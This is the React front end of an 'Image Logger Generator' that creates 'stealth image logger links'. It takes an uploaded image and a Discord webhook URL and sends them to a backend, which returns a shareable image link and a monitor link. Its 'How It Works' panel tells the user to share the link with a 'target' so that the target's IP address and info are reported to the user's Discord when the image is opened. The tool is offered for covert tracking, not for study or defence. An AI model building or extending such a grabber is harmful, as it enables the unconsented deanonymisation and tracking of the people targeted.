import React, { useState } from 'react'
import './ImageLogger.css'

const ImageLogger = () => {
  const [webhookUrl, setWebhookUrl] = useState('')
  const [imageFile, setImageFile] = useState(null)
  const [imagePreview, setImagePreview] = useState(null)
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)

  const handleFileChange = (e) => {
    const file = e.target.files[0]
    if (file) {
      setImageFile(file)
      const reader = new FileReader()
      reader.onload = (e) => setImagePreview(e.target.result)
      reader.readAsDataURL(file)
    }
  }

  const handleSubmit = async (e) => {
    e.preventDefault()
    setError(null)
    setResult(null)

    if (!webhookUrl || !imageFile) {
      setError('Please provide both webhook URL and image')
      return
    }

    setLoading(true)

    try {
      const reader = new FileReader()
      reader.onload = async (event) => {
        const base64Image = event.target.result

        const response = await fetch('/api/webhook', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            webhook_url: webhookUrl,
            image_data: base64Image
          })
        })

        const data = await response.json()

        if (response.ok) {
          const baseUrl = window.location.origin
          setResult({
            imageLink: baseUrl + data.image_link,
            monitorLink: baseUrl + data.monitor_link
          })
        } else {
          setError(data.error || 'Failed to generate links')
        }
        setLoading(false)
      }
      reader.readAsDataURL(imageFile)
    } catch (err) {
      setError(err.message)
      setLoading(false)
    }
  }

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text)
    alert('Copied to clipboard!')
  }

  return (
    <div className="image-logger-container">
      <div className="tool-card border-glow-red">
        <div className="card-header">
          <h2 className="card-title glow-red">🔗 Image Logger Generator</h2>
          <p className="card-description">Create stealth image logger links</p>
        </div>

        <form onSubmit={handleSubmit} className="logger-form">
          <div className="form-group">
            <label htmlFor="webhook">Discord Webhook URL</label>
            <input
              type="url"
              id="webhook"
              value={webhookUrl}
              onChange={(e) => setWebhookUrl(e.target.value)}
              placeholder="https://discord.com/api/webhooks/..."
              className="input-field"
              required
            />
          </div>

          <div className="form-group">
            <label htmlFor="image">Upload Image</label>
            <div className="file-upload-wrapper">
              <input
                type="file"
                id="image"
                accept=".png,.jpg,.jpeg,.gif"
                onChange={handleFileChange}
                className="file-input"
                required
              />
              <label htmlFor="image" className="file-label border-glow-red">
                {imageFile ? imageFile.name : '📤 Choose Image (PNG, JPG, JPEG, GIF)'}
              </label>
            </div>
            {imagePreview && (
              <div className="image-preview">
                <img src={imagePreview} alt="Preview" />
              </div>
            )}
          </div>

          <button type="submit" className="submit-btn box-glow-red" disabled={loading}>
            {loading ? '⏳ Generating...' : '⚡ Generate Logger Links'}
          </button>
        </form>

        {error && (
          <div className="alert alert-error">
            <span>❌</span> {error}
          </div>
        )}

        {result && (
          <div className="results-section">
            <div className="result-item">
              <label>📸 Image Link</label>
              <div className="link-box">
                <input type="text" value={result.imageLink} readOnly />
                <button onClick={() => copyToClipboard(result.imageLink)} className="copy-btn">
                  📋 Copy
                </button>
              </div>
            </div>

            <div className="result-item">
              <label>📊 Monitor Link</label>
              <div className="link-box">
                <input type="text" value={result.monitorLink} readOnly />
                <button onClick={() => copyToClipboard(result.monitorLink)} className="copy-btn">
                  📋 Copy
                </button>
              </div>
            </div>

            <div className="alert alert-success">
              <span>✅</span> Links generated successfully! Share the image link to start logging.
            </div>
          </div>
        )}
      </div>

      <div className="info-section">
        <div className="info-card border-glow-red">
          <h3>ℹ️ How It Works</h3>
          <ul>
            <li>Upload your image and provide a Discord webhook</li>
            <li>Share the generated image link with your target</li>
            <li>When they open it, you'll get their IP and info in Discord</li>
            <li>Monitor all clicks via the monitor link</li>
          </ul>
        </div>
      </div>
    </div>
  )
}

export default ImageLogger
